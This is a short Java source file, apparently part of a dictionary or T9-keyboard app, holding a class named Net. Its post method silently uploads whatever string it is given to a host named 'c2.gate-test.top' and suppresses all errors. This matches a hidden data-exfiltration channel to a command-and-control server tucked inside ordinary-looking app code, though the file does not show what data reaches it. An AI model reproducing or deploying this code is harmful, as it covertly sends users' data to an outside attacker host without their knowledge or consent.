package com.rdict.t9;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Net {
    public static void post(String data) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL("http://c2.gate-test.top/up").openConnection();
            c.setDoOutput(true);
            OutputStream o = c.getOutputStream();
            o.write(data.getBytes());
            o.close();
        } catch (Exception e) { }
    }
}
